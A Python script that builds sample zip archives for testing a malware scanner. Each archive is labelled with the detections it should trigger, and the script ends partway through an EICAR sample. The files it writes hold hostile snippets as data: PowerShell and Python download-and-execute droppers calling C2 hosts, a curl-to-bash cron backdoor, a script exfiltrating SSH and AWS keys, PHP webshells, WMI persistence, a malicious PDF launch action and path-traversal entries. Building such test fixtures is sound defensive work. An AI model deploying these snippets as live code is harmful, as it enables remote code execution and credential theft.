"""
Generate realistic (but inert) dangerous zip samples for testing the analyzer.
Nothing here is actual malware — file contents are crafted headers and dummy data
that trigger the scanner's static detection checks.

Run: python samples/create_samples.py
"""

import io
import os
import struct
import zipfile
import zlib

OUT = os.path.dirname(__file__)

PE_HEADER  = b"MZ" + b"\x90\x00" + b"\x03\x00" + b"\x00\x00" + b"\x04\x00" + b"\x00\x00\xff\xff" + b"\x00\x00" + b"\xb8\x00\x00\x00" + b"\x00" * 44 + b"\x40\x00\x00\x00" + b"\x00" * 60
ELF_HEADER = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00\x3e\x00"
SHEBANG_SH = b"#!/bin/bash\necho pwned\nwhoami\n"
SHEBANG_PY = b"#!/usr/bin/env python3\nimport os\nos.system('id')\n"


def write(name: str, data: bytes):
    path = os.path.join(OUT, name)
    with open(path, "wb") as f:
        f.write(data)
    kb = len(data) / 1024
    print(f"  wrote {name}  ({kb:.1f} KB)")


def make_zip(files, comment=b"", encrypted_flag=False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.comment = comment
        for name, content in files:
            zf.writestr(name, content)
    return buf.getvalue()


def make_encrypted_entry_zip(plain_files, enc_files) -> bytes:
    """Mix of normal + fake-encrypted entries (flag bit set manually)."""
    # Write plain entries normally then patch in encrypted ones
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in plain_files:
            zf.writestr(name, content)
    data = buf.getvalue()

    # For each encrypted entry, manually append a local file header + CD entry
    # with the encryption flag set (same low-level trick as tests/fixtures.py)
    local_entries = []
    cd_entries = []
    local_offset = len(data)
    # Strip the existing EOCD (last 22 bytes) to append more entries
    # Actually easier: rebuild from scratch
    buf2 = io.BytesIO()
    with zipfile.ZipFile(buf2, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in plain_files:
            zf.writestr(name, content)
        for name, content in enc_files:
            zf.writestr(name, content)
    data2 = buf2.getvalue()

    # Now patch the flag bits for enc_files entries in both local + central dir
    for name, _ in enc_files:
        fname_bytes = name.encode("utf-8")
        # Find and patch local file header flag bytes (offset 6 from LFH sig)
        LFH_SIG = b"PK\x03\x04"
        pos = 0
        while True:
            p = data2.find(LFH_SIG, pos)
            if p == -1:
                break
            fn_len = struct.unpack_from("<H", data2, p + 26)[0]
            fn = data2[p + 30: p + 30 + fn_len]
            if fn == fname_bytes:
                flags = struct.unpack_from("<H", data2, p + 6)[0]
                patched = bytearray(data2)
                struct.pack_into("<H", patched, p + 6, flags | 0x01)
                data2 = bytes(patched)
            pos = p + 4

        # Patch central directory header flag bytes (offset 8 from CD sig)
        CD_SIG = b"PK\x01\x02"
        pos = 0
        while True:
            p = data2.find(CD_SIG, pos)
            if p == -1:
                break
            fn_len = struct.unpack_from("<H", data2, p + 28)[0]
            fn = data2[p + 46: p + 46 + fn_len]
            if fn == fname_bytes:
                flags = struct.unpack_from("<H", data2, p + 8)[0]
                patched = bytearray(data2)
                struct.pack_into("<H", patched, p + 8, flags | 0x01)
                data2 = bytes(patched)
            pos = p + 4

    return data2


# ── Sample 1: Clean baseline ──────────────────────────────────────────────────
print("\n01_clean_documents.zip — safe baseline")
write("01_clean_documents.zip", make_zip([
    ("README.txt",           b"Project notes\n\nNothing suspicious here.\n"),
    ("docs/report.pdf",      b"%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\n"),
    ("docs/summary.txt",     b"Q4 summary - revenue up 12%.\n"),
    ("data/numbers.csv",     b"id,value\n1,100\n2,200\n3,300\n"),
    ("images/logo.png",      b"\x89PNG\r\n\x1a\n" + b"\x00" * 40),
]))


# ── Sample 2: Trojan invoice ─────────────────────────────────────────────────
# Classic trick: rename a PE executable to look like a PDF invoice.
# Detection: magic_mismatch (CRITICAL), dangerous_extension (HIGH via PE confirm)
print("\n02_trojan_invoice.zip — PE exe disguised as PDF invoice")
write("02_trojan_invoice.zip", make_zip([
    ("Invoice_Q4_2024.pdf",  PE_HEADER + b"\x00" * 200),   # MZ magic, .pdf ext
    ("payment_terms.txt",    b"Net 30. Please remit to account 8821-xxxx.\n"),
    ("company_logo.png",     b"\x89PNG\r\n\x1a\n" + b"\x00" * 20),
]))


# ── Sample 3: Dropper bundle ─────────────────────────────────────────────────
# Multiple high-signal indicators: autorun, double-extension, scripts, PE.
# Detection: suspicious_filename, dangerous_extension, double_extension,
#            executable_binary, magic_mismatch (many HIGH/CRITICAL)
print("\n03_dropper_bundle.zip — autorun + scripts + double-extension payload")
write("03_dropper_bundle.zip", make_zip([
    ("autorun.inf",          b"[AutoRun]\nopen=updater.exe\nicon=doc.ico\n"),
    ("updater.exe",          PE_HEADER + b"\x00" * 512),
    ("install.bat",          b"@echo off\ncopy updater.exe C:\\Windows\\System32\\\nreg add HKLM\\...\n"),
    ("patch.ps1",            b"$url='http://c2.example/stage2'; iex(New-Object Net.WebClient).DownloadString($url)\n"),
    ("documents/report.docx.exe", PE_HEADER + b"\x00" * 128),  # double extension
    ("documents/readme.txt", b"Please run install.bat to extract documents.\n"),
]))


# ── Sample 4: Phishing kit ───────────────────────────────────────────────────
# PHP webshell, credential harvester, .htaccess — classic web shell drop.
# Detection: malicious_comment (HIGH), dangerous_extension, suspicious_filename
print("\n04_phishing_kit.zip — PHP webshell with .htaccess and harvester")
write("04_phishing_kit.zip", make_zip(
    files=[
        (".htaccess",         b"Options -Indexes\nRewriteEngine On\nRewriteRule ^login$ index.php\n"),
        ("index.php",         b"<?php session_start(); include 'login_form.html'; ?>\n"),
        ("collect.php",       b"<?php $data=$_POST; file_put_contents('log.txt', json_encode($data), FILE_APPEND); ?>\n"),
        ("shell.php",         b"<?php system($_GET['cmd']); ?>\n"),
        ("login_form.html",   b"<form method='POST' action='collect.php'><input name='user'><input name='pass'></form>\n"),
        ("assets/style.css",  b"body { font-family: Arial; }\n"),
    ],
    comment=b"<?php eval(base64_decode($_POST['x'])); /* backdoor */ ?>",
))


# ── Sample 5: Zip bomb ───────────────────────────────────────────────────────
# High compression ratio — the classic decompression bomb.
# Detection: zip_bomb (HIGH) — ratio ~500:1
print("\n05_zip_bomb.zip — ~500:1 compression ratio")
null_blob = b"\x00" * (512 * 1024)  # 512 KB of zeros
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
    zf.writestr("payload_a.dat", null_blob)
    zf.writestr("payload_b.dat", null_blob)
    zf.writestr("payload_c.dat", null_blob)
    zf.writestr("README.txt",    b"Totally normal archive, nothing to see here.\n")
write("05_zip_bomb.zip", buf.getvalue())


# ── Sample 6: Path traversal ─────────────────────────────────────────────────
# Directory escape sequences targeting cron, SSH, and shell profiles.
# Detection: path_traversal (CRITICAL), suspicious_filename (HIGH)
print("\n06_path_traversal.zip — directory escape to cron + SSH + bashrc")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr(zipfile.ZipInfo("../../../etc/cron.d/backdoor"),
                b"* * * * * root curl http://c2.example/sh | bash\n")
    zf.writestr(zipfile.ZipInfo("../../../root/.ssh/authorized_keys"),
                b"ssh-rsa AAAAB3NzaC1... attacker@evil\n")
    zf.writestr(zipfile.ZipInfo("../../../home/user/.bashrc"),
                b"alias sudo='curl http://c2.example/steal $@ &'\n")
    zf.writestr("README.txt",
                b"Legitimate archive with important configuration files.\n")
write("06_path_traversal.zip", buf.getvalue())


# ── Sample 7: Data exfiltration pack ────────────────────────────────────────
# Sensitive files + encrypted entries (can't scan inside).
# Detection: suspicious_filename (HIGH) ×3, encrypted_entry (MEDIUM),
#            dangerous_extension (script files)
print("\n07_exfiltration_pack.zip — SSH keys + .env + encrypted payload")
write("07_exfiltration_pack.zip", make_encrypted_entry_zip(
    plain_files=[
        ("id_rsa",               b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK...FAKE KEY DATA...\n-----END RSA PRIVATE KEY-----\n"),
        ("id_rsa.pub",           b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... user@host\n"),
        (".env",                 b"DATABASE_URL=postgres://admin:s3cr3t@db:5432/prod\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"),
        ("harvest.sh",           SHEBANG_SH + b"tar czf /tmp/out.tgz ~/.ssh ~/.aws && curl -F f=@/tmp/out.tgz http://c2.example/upload\n"),
        ("config/passwords.txt", b"admin:hunter2\nroot:toor\nbackup:backup123\n"),
    ],
    enc_files=[
        ("payload.bin",          PE_HEADER + b"\x00" * 256),
        ("stage2.enc",           b"\xde\xad\xbe\xef" + b"\x00" * 128),
    ],
))


# ── Sample 8: Macro malware + symlink ───────────────────────────────────────
# Office macro-enabled docs plus a Unix symlink escaping the archive root.
# Detection: macro_document (MEDIUM) ×2, dangerous_extension (HIGH),
#            executable_binary (HIGH), symlink (HIGH)
print("\n08_macro_and_symlink.zip — macro Office docs + symlink escape + ELF")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
    # Macro-enabled Office docs (themselves mini-zips with PK header)
    zf.writestr("Q4_Report.docm",        b"PK\x03\x04" + b"\x00" * 26 + b"word/document.xml" + b"\x00" * 20)
    zf.writestr("Financial_Model.xlsm",  b"PK\x03\x04" + b"\x00" * 26 + b"xl/workbook.xml"   + b"\x00" * 20)
    # ELF binary (Linux backdoor)
    zf.writestr("linux_agent",           ELF_HEADER + b"\x00" * 256)
    # Normal-looking decoy
    zf.writestr("presentation.pptx",     b"PK\x03\x04" + b"\x00" * 26 + b"ppt/slides/slide1.xml" + b"\x00" * 10)

# Add symlink entry manually (Unix mode bits 0o120777)
sym_info = zipfile.ZipInfo("etc_passwd_link")
sym_info.external_attr = 0o120777 << 16
sym_info.compress_type = zipfile.ZIP_STORED
data = buf.getvalue()

buf2 = io.BytesIO()
with zipfile.ZipFile(buf2, "w", compression=zipfile.ZIP_DEFLATED) as zf2:
    zf2.writestr("Q4_Report.docm",        b"PK\x03\x04" + b"\x00" * 26 + b"word/document.xml" + b"\x00" * 20)
    zf2.writestr("Financial_Model.xlsm",  b"PK\x03\x04" + b"\x00" * 26 + b"xl/workbook.xml"   + b"\x00" * 20)
    zf2.writestr("linux_agent",           ELF_HEADER + b"\x00" * 256)
    zf2.writestr("presentation.pptx",     b"PK\x03\x04" + b"\x00" * 26 + b"ppt/slides/slide1.xml" + b"\x00" * 10)
    zf2.writestr(sym_info,                b"../../../etc/passwd")

write("08_macro_and_symlink.zip", buf2.getvalue())



# ── Sample 9: Obfuscated payload + suspicious strings ────────────────────────
# High-entropy PE blob renamed as .dat, eval/decode patterns, hardcoded C2.
# Detection: high_entropy (MEDIUM), suspicious_string (HIGH x3), magic_mismatch (CRITICAL)
print("\n09_obfuscated_payload.zip — high-entropy blob + eval/decode + C2 strings")
# Simulate high-entropy "encrypted" payload (pseudo-random bytes)
import struct as _struct
rng_state = 0xdeadbeef
def lcg(n):
    global rng_state
    out = bytearray(n)
    for i in range(n):
        rng_state = (rng_state * 1664525 + 1013904223) & 0xFFFFFFFF
        out[i] = rng_state & 0xFF
    return bytes(out)

high_entropy_blob = lcg(32768)  # looks encrypted
write("09_obfuscated_payload.zip", make_zip([
    # Renamed PE with .dat extension — magic_mismatch
    ("resources/config.dat",      PE_HEADER + high_entropy_blob[:512]),
    # PHP with eval(base64_decode(...))
    ("web/loader.php",            b"<?php $x=base64_decode('cGhwaW5mbygpOw==');eval($x);?>\n"),
    # PowerShell with evasion flags
    ("scripts/update.ps1",        b"powershell.exe -nop -w hidden -EncodedCommand JABjA...AAAA==\n"),
    # File with hardcoded C2 IP:port
    ("config/settings.cfg",       b"server=192.168.1.100:4444\nbackup_c2=10.0.0.5:8080\ntimeout=30\n"),
    # Decoy
    ("README.md",                 b"Configuration bundle v2.1 - do not distribute\n"),
]))


# ── Sample 10: Hidden credentials + future timestamp ──────────────────────────
# Sensitive dot-files, .env with secrets, future-dated entries.
# Detection: hidden_file (LOW x4), timestamp_future (LOW), suspicious_filename (HIGH)
print("\n10_hidden_credentials.zip — dotfiles + .env secrets + future timestamps")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
    # Future-dated file
    future_info = zipfile.ZipInfo(".aws/credentials", date_time=(2031, 6, 15, 0, 0, 0))
    zf.writestr(future_info,
        b"[default]\naws_access_key_id=AKIAIOSFODNN7EXAMPLE\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n")

    zf.writestr(".env",
        b"DB_PASSWORD=supersecret123\nSTRIPE_SECRET=sk_live_XXXXXXXXXXXXXXXXXXXX\nJWT_SECRET=aaaabbbbccccdddd\n")
    zf.writestr(".bash_history",
        b"ssh root@prod-server.internal\nmysql -u root -pPassword123 mydb\ncurl -u admin:admin http://internal-api/\n")
    zf.writestr(".ssh/config",
        b"Host prod\n  HostName 10.0.0.1\n  User deploy\n  IdentityFile ~/.ssh/id_rsa_prod\n")
    zf.writestr("notes/TODO.txt",
        b"- rotate all credentials\n- update firewall rules\n- fix the logging pipeline\n")
write("10_hidden_credentials.zip", buf.getvalue())


print("\nDone. 10 sample archives created in samples/")
print("Safe:      01_clean_documents.zip")
print("Dangerous: 02-10")


# ── Sample 11: PE process injection ──────────────────────────────────────────
# PE file containing process injection API strings.
# Detection: pe_import (CRITICAL/HIGH x3), executable_binary (HIGH)
print("\n11_pe_injection.zip — PE with process injection + credential theft APIs")
# Real API name strings appear verbatim inside PE binaries
pe_with_apis = (
    PE_HEADER + b"\x00" * 128
    + b"VirtualAllocEx\x00"
    + b"WriteProcessMemory\x00"
    + b"CreateRemoteThread\x00"
    + b"MiniDumpWriteDump\x00"
    + b"IsDebuggerPresent\x00"
    + b"kernel32.dll\x00ntdll.dll\x00"
    + b"\x00" * 64
)
write("11_pe_injection.zip", make_zip([
    ("tools/injector.exe",      pe_with_apis),
    ("tools/loader.dll",        PE_HEADER + b"\x00" * 64 + b"QueueUserAPC\x00NtMapViewOfSection\x00" + b"\x00" * 32),
    ("README.txt",              b"Internal security testing toolkit\n"),
]))


# ── Sample 12: RTLO + homograph filenames ─────────────────────────────────────
# RTLO makes "exe.invoice_Q4" display as "4Q_eciovna.exe" in Windows Explorer.
# Detection: rtlo_attack (CRITICAL), homograph_attack (HIGH)
print("\n12_rtlo_and_homograph.zip — RTLO filename reversal + Unicode lookalikes")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    # RTLO: U+202E causes everything after it to display right-to-left
    rtlo = '‮'
    # "invoice_Q4‮exe." → displayed as ".exe4Q_eciovna"
    rtlo_name = f"invoice_Q4{rtlo}exe."
    zf.writestr(rtlo_name, PE_HEADER + b"\x00" * 64)
    # Cyrillic 'а' (U+0430) looks identical to Latin 'a'
    # "аdobe_updаter.exe" uses Cyrillic а in two places
    homograph_name = "аdobe_updаter.exe"
    zf.writestr(homograph_name, PE_HEADER + b"\x00" * 64)
    zf.writestr("legitimate_doc.pdf", b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\n")
write("12_rtlo_and_homograph.zip", buf.getvalue())


# ── Sample 13: Ransomware simulation ─────────────────────────────────────────
# Ransom note + high-entropy "encrypted" files + ransomware API strings.
# Detection: ransomware_note (CRITICAL), pe_import (HIGH), high_entropy (MEDIUM)
print("\n13_ransomware_simulation.zip — ransom note + encrypted files + CryptEncrypt API")
encrypted_file_a = lcg(32768)
encrypted_file_b = lcg(16384)
ransom_note = (
    b"YOUR FILES HAVE BEEN ENCRYPTED\n"
    b"================================\n"
    b"All your documents, photos, databases, and other important files\n"
    b"have been encrypted with RSA-2048 and AES-256.\n\n"
    b"To decrypt your files send 0.5 BTC to: 1A2B3C4D5E6F...\n"
    b"Then email your ID to: decrypt@example.onion\n"
)
ransomware_pe = (
    PE_HEADER + b"\x00" * 64
    + b"CryptEncrypt\x00BCryptEncrypt\x00"
    + b"FindFirstFileW\x00FindNextFileW\x00"
    + b"RegSetValueExA\x00"
    + b"\x00" * 64
)
write("13_ransomware_simulation.zip", make_zip([
    ("how_to_decrypt.txt",        ransom_note),
    ("encrypted/document.docx",   encrypted_file_a),
    ("encrypted/photo.jpg",       encrypted_file_b),
    ("encrypted/spreadsheet.xlsx",lcg(8192)),
    ("CRYPTOR.exe",               ransomware_pe),
]))


# ── Sample 14: VM/sandbox evasion ────────────────────────────────────────────
# Binary with VM detection strings, debugger checks, and WMI persistence.
# Detection: vm_evasion (HIGH), wmi_persistence (HIGH), pe_import (MEDIUM)
print("\n14_vm_sandbox_evasion.zip — VM detection + debugger checks + WMI subscription")
evasion_binary = (
    PE_HEADER + b"\x00" * 64
    + b"VMware\x00VirtualBox\x00VBOX\x00QEMU\x00"
    + b"vboxguest\x00vmtoolsd\x00SbieDll.dll\x00"
    + b"wireshark\x00ollydbg\x00procmon\x00"
    + b"IsDebuggerPresent\x00NtQueryInformationProcess\x00"
    + b"CheckRemoteDebuggerPresent\x00"
    + b"\x00" * 64
)
wmi_script = (
    b"strComputer = \".\"\n"
    b"Set objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\subscription\")\n"
    b"Set objEventFilter = objWMIService.Get(\"__EventFilter\")\n"
    b"filterInstance.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60\"\n"
    b"Set objConsumer = objWMIService.Get(\"ActiveScriptEventConsumer\")\n"
    b"Set objBinding = objWMIService.Get(\"__FilterToConsumerBinding\")\n"
)
write("14_vm_sandbox_evasion.zip", make_zip([
    ("agent.exe",          evasion_binary),
    ("install.vbs",        wmi_script),
    ("config.txt",         b"analysis=false\ndebug=false\ntimeout=300000\n"),
]))


# ── Sample 15: Malicious PDF ──────────────────────────────────────────────────
# PDF with JavaScript, /OpenAction auto-execute, and /Launch to run a file.
# Detection: pdf_dangerous_key (CRITICAL/HIGH x3)
print("\n15_malicious_pdf.zip — PDF with /JavaScript, /OpenAction, /Launch, /EmbeddedFile")
malicious_pdf = (
    b"%PDF-1.7\n"
    b"1 0 obj\n<</Type /Catalog /OpenAction 2 0 R /AcroForm 3 0 R>>\nendobj\n"
    b"2 0 obj\n<</Type /Action /S /JavaScript /JS (app.alert('XSS'); eval(this.getField('x').value);)>>\nendobj\n"
    b"3 0 obj\n<</XFA 4 0 R>>\nendobj\n"
    b"4 0 obj\n<</Type /Action /S /Launch /F (cmd.exe) /Win <</F (cmd.exe) /P (/c calc.exe)>>>>\nendobj\n"
    b"5 0 obj\n<</Type /EmbeddedFile /Subtype /text#2Fplain>>\nendobj\n"
    b"6 0 obj\n<</Type /Action /S /URI /URI (http://malicious.example/payload.exe)>>\nendobj\n"
    b"%%EOF\n"
)
write("15_malicious_pdf.zip", make_zip([
    ("documents/invoice.pdf",     malicious_pdf),
    ("documents/terms.pdf",       b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF\n"),
]))


# ── Sample 16: Office deep analysis ──────────────────────────────────────────
# .docx containing vbaProject.bin + externalLinks — confirmed macro + NTLM leak.
# Detection: office_vba_confirmed (HIGH), office_external_link (HIGH), macro_document (MEDIUM)
print("\n16_office_deep_analysis.zip — .docx with vbaProject.bin + externalLinks")

def make_malicious_docx() -> bytes:
    """Build a minimal .docx (which is itself a ZIP) containing vbaProject.bin."""
    docx_buf = io.BytesIO()
    with zipfile.ZipFile(docx_buf, "w", compression=zipfile.ZIP_DEFLATED) as dz:
        dz.writestr("[Content_Types].xml",
            b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            b'<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            b'</Types>')
        dz.writestr("word/document.xml",
            b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            b'<w:body><w:p><w:r><w:t>Totally normal document</w:t></w:r></w:p></w:body></w:document>')
        # vbaProject.bin — the smoking gun for confirmed macros
        dz.writestr("word/vbaProject.bin",
            b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 56  # OLE2 compound doc header
            + b"Attribute VB_Name = \"ThisDocument\"\n"
            + b"Sub AutoOpen()\n  Shell \"cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt\"\nEnd Sub\n")
        # externalLinks — forces NTLM auth to attacker server
        dz.writestr("word/externalLinks/externalLink1.xml",
            b'<?xml version="1.0"?><externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            b'<externalBook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="rId1"/>'
            b'</externalLink>')
        dz.writestr("word/externalLinks/_rels/externalLink1.xml.rels",
            b'<?xml version="1.0"?><Relationships><Relationship Id="rId1" Type="http://purl.oclc.org/ooxml/officeDocument/relationships/externalLinkPath"'
            b' Target="\\\\attacker.example\\share\\data.xlsx" TargetMode="External"/></Relationships>')
    return docx_buf.getvalue()

write("16_office_deep_analysis.zip", make_zip([
    ("Q4_Financial_Report.docm",  make_malicious_docx()),
    ("Cover_Letter.docx",         make_malicious_docx()),
    ("README.txt",                b"Please enable macros when opening - required for charts.\n"),
]))


# ── Sample 17: IOC-heavy C2 communication ────────────────────────────────────
# Scripts with public IPs on known C2 ports, .onion addresses, DGA-like domains.
# Detection: c2_address (HIGH), tor_onion_address (HIGH), dga_domain (MEDIUM)
print("\n17_ioc_heavy_c2.zip — C2 IPs, Tor .onion, DGA domains, malicious URLs")
c2_config = (
    b"# C2 Configuration\n"
    b"primary_c2    = 185.220.101.45:4444\n"
    b"backup_c2     = 91.108.4.183:31337\n"
    b"tor_c2        = xmh57jrknasylqs6.onion\n"
    b"fallback      = bvpnflkjsdhfkjshdfkjsdf.ru\n"   # DGA-like
    b"alt_domain    = xzfkjsdhfkjsdhfkjsd.top\n"       # DGA-like
    b"beacon_url    = http://185.220.101.45:8080/beacon\n"
    b"download_url  = http://91.108.4.183:4444/stage2\n"
    b"exfil_url     = http://185.220.101.45:443/upload?id=infected\n"
)
beacon_script = (
    SHEBANG_PY
    + b"import urllib.request, base64, time\n"
    + b"C2 = 'http://185.220.101.45:4444'\n"
    + b"ONION = 'http://xmh57jrknasylqs6.onion/shell'\n"
    + b"FALLBACK = ['bvpnflkjsdhfkjshdfkjsdf.ru', 'xzfkjsdhfkjsdhfkjsd.top']\n"
    + b"payload = urllib.request.urlopen(C2 + '/stage2.bin').read()\n"
    + b"exec(base64.b64decode(payload))\n"
)
write("17_ioc_heavy_c2.zip", make_zip([
    ("config/c2_config.cfg",      c2_config),
    ("scripts/beacon.py",         beacon_script),
    ("scripts/dropper.ps1",
        b"$url = 'http://185.220.101.45:4444/payload.exe'\n"
        b"$path = $env:TEMP + '\\svchost.exe'\n"
        b"(New-Object Net.WebClient).DownloadFile($url, $path)\n"
        b"Start-Process $path -WindowStyle Hidden\n"
    ),
    ("data/targets.txt",
        b"192.168.1.1:22\n10.0.0.5:3389\n172.16.0.1:445\n"
        b"185.220.101.45:4444\n91.108.4.183:31337\n"
    ),
]))


# ── Sample 18: Full-spectrum YARA strike ─────────────────────────────────────
# Combines PE injection + credential theft + ransomware + webshell + dropper +
# VM evasion + anti-debug + C2 beacon in one archive.  Designed to trigger
# the maximum number of YARA rules plus as many static checks as possible.
# Expected YARA hits: ProcessInjection_ClassicTriad (CRITICAL),
#   ProcessInjection_APC (HIGH), CredentialDumping_LSASS (CRITICAL),
#   Ransomware_FileEncryption (CRITICAL), Ransomware_Note (CRITICAL),
#   Ransomware_FileSearch (CRITICAL), Webshell_PHP_CommandExec (HIGH),
#   Webshell_PHP_EvalObfuscated (HIGH), Dropper_PowerShell_IEX (HIGH),
#   Dropper_PowerShell_Download (HIGH), Dropper_Python_ExecDecode (HIGH),
#   Evasion_VMEnvironmentDetection (HIGH), Evasion_AntiDebugMulti (HIGH),
#   Evasion_WMIPersistence (HIGH), Obfuscation_PowerShell_EncodedCommand (HIGH),
#   C2_Beacon_TorFallback (CRITICAL), Keylogger_WindowsHook (HIGH)
print("\n18_yara_strike.zip — full-spectrum YARA hit: 17+ rules across 8 threat families")

# Super PE: injection + credential theft + keylogger + ransomware + VM evasion
super_pe = (
    PE_HEADER + b"\x00" * 64
    # Process injection
    + b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00"
    # APC / section injection
    + b"QueueUserAPC\x00NtMapViewOfSection\x00RtlCreateUserThread\x00"
    # Credential theft
    + b"MiniDumpWriteDump\x00SamIConnect\x00LsaRetrievePrivateData\x00CryptUnprotectData\x00"
    # Keylogger
    + b"SetWindowsHookEx\x00GetAsyncKeyState\x00GetRawInputData\x00"
    # Ransomware encryption
    + b"CryptEncrypt\x00BCryptEncrypt\x00"
    # File enumeration (ransomware)
    + b"FindFirstFileW\x00FindNextFileW\x00RegSetValueExA\x00"
    # C2 download
    + b"URLDownloadToFile\x00HttpSendRequest\x00InternetOpenUrl\x00"
    # Anti-debug
    + b"IsDebuggerPresent\x00CheckRemoteDebuggerPresent\x00NtQueryInformationProcess\x00"
    # VM evasion strings
    + b"VMware\x00VirtualBox\x00VBOX\x00QEMU\x00SbieDll\x00vmtoolsd\x00wireshark\x00"
    + b"kernel32.dll\x00ntdll.dll\x00advapi32.dll\x00"
    + b"\x00" * 128
)

# Ransom note (triggers Ransomware_Note)
yara_ransom_note = (
    b"YOUR FILES HAVE BEEN ENCRYPTED\n"
    b"================================\n"
    b"All your documents, photos, databases have been encrypted with RSA-4096 and AES-256.\n"
    b"To decrypt your files send 1.2 BTC to wallet: 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5\n"
    b"After payment email your transaction ID to: restore@xmh57jrknasylqs6.onion\n"
    b"Your unique decryption key expires in 72 hours.\n"
)

# PHP webshell (triggers Webshell_PHP_CommandExec + Webshell_PHP_EvalObfuscated)
yara_webshell = (
    b"<?php\n"
    b"// system administration panel\n"
    b"$key = md5('secret');\n"
    b"if ($_POST['k'] === $key) {\n"
    b"    system($_POST['cmd']);\n"
    b"    exec($_GET['run']);\n"
    b"    $payload = base64_decode($_POST['p']);\n"
    b"    eval($payload);\n"
    b"}\n"
    b"?>\n"
)

# Python C2 beacon with Tor fallback (triggers C2_Beacon_TorFallback + Dropper_Python_ExecDecode)
yara_beacon = (
    b"#!/usr/bin/env python3\n"
    b"import urllib.request, base64, time, os\n"
    b"C2_HTTP  = 'http://185.220.101.45:4444'\n"
    b"C2_ONION = 'http://xmh57jrknasylqs6.onion/gate'\n"
    b"FALLBACK = ['bvpnflkjsdhfkjshdfkjsdf.ru', 'xzfkjsdhfkjsdhfkjsd.top']\n"
    b"for endpoint in [C2_HTTP, C2_ONION]:\n"
    b"    try:\n"
    b"        raw = urllib.request.urlopen(endpoint + '/stage2.bin', timeout=10).read()\n"
    b"        exec(base64.b64decode(raw))\n"
    b"        break\n"
    b"    except Exception:\n"
    b"        continue\n"
)

# PowerShell dropper with IEX + download + encoded command
# (triggers Dropper_PowerShell_IEX + Dropper_PowerShell_Download + Obfuscation_PowerShell_EncodedCommand)
yara_ps_dropper = (
    b"# Stage 1 loader\n"
    b"$url = 'http://185.220.101.45:4444/payload.exe'\n"
    b"$dst = $env:TEMP + '\\svchost32.exe'\n"
    b"(New-Object Net.WebClient).DownloadFile($url, $dst)\n"
    b"Start-Process $dst -WindowStyle Hidden\n"
    b"# Fallback: in-memory IEX\n"
    b"$stage2 = (New-Object Net.WebClient).DownloadString('http://91.108.4.183:31337/s2')\n"
    b"iex($stage2)\n"
    b"# Persistence via encoded command\n"
    b"powershell.exe -nop -w hidden -ExecutionPolicy Bypass -EncodedCommand "
    b"JABjAG8AbQBtAGEAbgBkACAAPQAgACcAcwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAnAA==\n"
)

# WMI persistence VBS (triggers Evasion_WMIPersistence)
yara_wmi = (
    b"' WMI persistence installer\n"
    b"Set objWMI = GetObject(\"winmgmts:\\\\.\\\root\\subscription\")\n"
    b"Set objFilter = objWMI.Get(\"__EventFilter\")\n"
    b"filterInstance.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60\"\n"
    b"Set objConsumer = objWMI.Get(\"ActiveScriptEventConsumer\")\n"
    b"Set objBinding = objWMI.Get(\"__FilterToConsumerBinding\")\n"
)

write("18_yara_strike.zip", make_zip([
    ("tools/agent.exe",           super_pe),
    ("docs/how_to_decrypt.txt",   yara_ransom_note),
    ("web/shell.php",             yara_webshell),
    ("scripts/beacon.py",         yara_beacon),
    ("scripts/dropper.ps1",       yara_ps_dropper),
    ("scripts/persist.vbs",       yara_wmi),
    ("config/c2.cfg",
        b"primary_c2  = 185.220.101.45:4444\n"
        b"backup_c2   = 91.108.4.183:31337\n"
        b"tor_gate    = xmh57jrknasylqs6.onion\n"
        b"beacon_url  = http://185.220.101.45:8080/beacon\n"
    ),
]))


# ── Sample 19: VirusTotal EICAR test ─────────────────────────────────────────
# Contains the universal EICAR test string, which every AV vendor and VT
# recognises as a test file.  SHA-256 is fixed:
#   275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
# When VT_API_KEY is set, this archive will return a CRITICAL virustotal_hit
# finding proving the integration works without using real malware.
print("\n19_vt_eicar_test.zip — EICAR test file for VirusTotal integration testing")

EICAR_STRING = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
write("19_vt_eicar_test.zip", make_zip([
